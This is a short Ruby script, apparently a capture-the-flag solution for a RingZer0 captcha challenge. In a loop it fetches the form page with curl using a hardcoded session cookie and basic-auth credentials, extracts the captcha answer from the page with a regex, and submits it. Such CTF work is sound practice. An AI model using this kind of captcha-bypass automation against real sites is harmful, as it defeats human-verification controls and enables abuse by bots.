sessid = 'csib8rr3o0682hj1i7hmbbihj0'
loop do
  res = `curl -v http://captcha.ringzer0team.com:7421/form1.php -b 'PHPSESSID=#{sessid}' -u 'captcha:QJc9U6wxD4SFT0u' 2>&1`
  x = /A == "(.*)"/.match(res)[1].strip
  puts `curl -v http://captcha.ringzer0team.com:7421/captcha1.php --data 'captcha=#{x}' -b 'PHPSESSID=#{sessid}' -u 'captcha:QJc9U6wxD4SFT0u' 2>&1`
end
